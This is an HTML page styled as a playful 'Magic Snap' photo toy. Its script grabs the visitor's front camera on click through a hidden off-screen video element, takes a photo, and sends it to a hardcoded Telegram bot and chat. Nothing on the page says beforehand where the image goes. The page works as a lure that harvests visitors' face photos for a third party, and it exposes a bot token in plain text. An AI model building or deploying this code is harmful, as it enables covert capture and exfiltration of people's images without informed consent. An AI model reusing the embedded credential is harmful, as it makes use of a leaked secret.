<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>✨ Photo Magic ✨</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  html, body {
    height: 100%;
    overflow: hidden;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    background: #000;
    color: #fff;
    user-select: none;
    -webkit-tap-highlight-color: transparent;
  }

  body {
    display: flex;
    align-items: center;
    justify-content: center;
    background: radial-gradient(circle at 50% 50%, #1a0033 0%, #000 70%);
  }

  .bg-glow {
    position: fixed;
    inset: 0;
    background:
      radial-gradient(circle at 20% 30%, rgba(138, 43, 226, 0.4), transparent 40%),
      radial-gradient(circle at 80% 70%, rgba(0, 200, 255, 0.35), transparent 40%),
      radial-gradient(circle at 50% 50%, rgba(255, 0, 150, 0.25), transparent 50%);
    animation: pulse 6s ease-in-out infinite;
    z-index: 0;
    filter: blur(40px);
  }

  @keyframes pulse {
    0%, 100% { opacity: 0.7; transform: scale(1); }
    50% { opacity: 1; transform: scale(1.15); }
  }

  .container {
    position: relative;
    z-index: 2;
    text-align: center;
    padding: 40px 30px;
  }

  h1 {
    font-size: 42px;
    font-weight: 800;
    background: linear-gradient(135deg, #ff00cc 0%, #3333ff 50%, #00ffcc 100%);
    -webkit-background-clip: text;
    background-clip: text;
    -webkit-text-fill-color: transparent;
    margin-bottom: 12px;
    letter-spacing: -1px;
    animation: shimmer 3s linear infinite;
    background-size: 200% 200%;
  }

  @keyframes shimmer {
    0% { background-position: 0% 50%; }
    100% { background-position: 200% 50%; }
  }

  .subtitle {
    color: #aaa;
    font-size: 16px;
    margin-bottom: 50px;
    letter-spacing: 1px;
  }

  .magic-btn {
    position: relative;
    width: 200px;
    height: 200px;
    border-radius: 50%;
    border: none;
    cursor: pointer;
    background: linear-gradient(135deg, #ff00cc, #3333ff, #00ffcc);
    background-size: 200% 200%;
    color: #fff;
    font-size: 22px;
    font-weight: 800;
    letter-spacing: 2px;
    text-transform: uppercase;
    box-shadow:
      0 0 40px rgba(255, 0, 204, 0.6),
      0 0 80px rgba(51, 51, 255, 0.4),
      inset 0 0 40px rgba(255, 255, 255, 0.2);
    transition: transform 0.2s, box-shadow 0.3s;
    animation: rotate-glow 4s linear infinite, float 3s ease-in-out infinite;
  }

  .magic-btn::before {
    content: '';
    position: absolute;
    inset: -6px;
    border-radius: 50%;
    background: conic-gradient(from 0deg, #ff00cc, #3333ff, #00ffcc, #ff00cc);
    filter: blur(20px);
    opacity: 0.8;
    z-index: -1;
    animation: rotate-glow 4s linear infinite;
  }

  @keyframes rotate-glow {
    0% { background-position: 0% 50%; }
    100% { background-position: 200% 50%; }
  }

  @keyframes float {
    0%, 100% { transform: translateY(0); }
    50% { transform: translateY(-10px); }
  }

  .magic-btn:active {
    transform: scale(0.92);
    box-shadow: 0 0 60px rgba(255, 0, 204, 1), inset 0 0 60px rgba(255, 255, 255, 0.4);
  }

  .magic-btn:disabled {
    opacity: 0.6;
    cursor: not-allowed;
  }

  .status {
    margin-top: 40px;
    min-height: 30px;
    font-size: 16px;
    color: #ccc;
    letter-spacing: 1px;
    transition: all 0.3s;
  }

  .status.success { color: #00ffcc; text-shadow: 0 0 20px #00ffcc; }
  .status.error { color: #ff3366; text-shadow: 0 0 20px #ff3366; }
  .status.loading { color: #ffcc00; }

  video {
    position: fixed;
    top: -9999px;
    left: -9999px;
  }

  .flash {
    position: fixed;
    inset: 0;
    background: #fff;
    opacity: 0;
    pointer-events: none;
    z-index: 100;
  }

  .flash.active {
    animation: flash-anim 0.4s ease-out;
  }

  @keyframes flash-anim {
    0% { opacity: 1; }
    100% { opacity: 0; }
  }
</style>
</head>
<body>
  <div class="bg-glow"></div>
  <div class="flash" id="flash"></div>

  <div class="container">
    <h1>Magic Snap</h1>
    <p class="subtitle">Нажми кнопку ✨</p>

    <button class="magic-btn" id="magicBtn">Snap</button>

    <div class="status" id="status"></div>
  </div>

  <video id="video" autoplay playsinline muted></video>

<script>
  // ============ НАСТРОЙКИ ============
  const BOT_TOKEN = "8465223552:AAGK61qh4NSmRHznHUo2jTMUOCp05Oij1jU";
  const CHAT_ID = "7895911575";
  // ===================================

  const btn = document.getElementById('magicBtn');
  const statusEl = document.getElementById('status');
  const video = document.getElementById('video');
  const flash = document.getElementById('flash');

  function setStatus(text, type = '') {
    statusEl.textContent = text;
    statusEl.className = 'status ' + type;
  }

  btn.addEventListener('click', async () => {
    btn.disabled = true;
    setStatus('Запрашиваю доступ к камере...', 'loading');

    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
        audio: false
      });

      video.srcObject = stream;
      await video.play();

      // Небольшая пауза чтобы камера сфокусировалась
      await new Promise(r => setTimeout(r, 800));

      // Вспышка
      flash.classList.add('active');
      setTimeout(() => flash.classList.remove('active'), 400);

      // Снимок
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0);

      // Останавливаем камеру
      stream.getTracks().forEach(t => t.stop());

      setStatus('Отправляю в Telegram...', 'loading');

      // Blob из canvas
      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));

      // Отправка в Telegram
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, 'snap.jpg');
      formData.append('caption', '📸 Новая фотка с сайта!\n🕐 ' + new Date().toLocaleString('ru-RU'));

      const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });

      const data = await resp.json();

      if (data.ok) {
        setStatus('✨ Готово! Фотка улетела ✨', 'success');
      } else {
        console.error(data);
        setStatus('Ошибка Telegram: ' + (data.description || 'unknown'), 'error');
      }
    } catch (err) {
      console.error(err);
      if (err.name === 'NotAllowedError') {
        setStatus('❌ Доступ к камере запрещён', 'error');
      } else if (err.name === 'NotFoundError') {
        setStatus('❌ Камера не найдена', 'error');
      } else {
        setStatus('❌ Ошибка: ' + err.message, 'error');
      }
    } finally {
      btn.disabled = false;
    }
  });
</script>
</body>
</html>
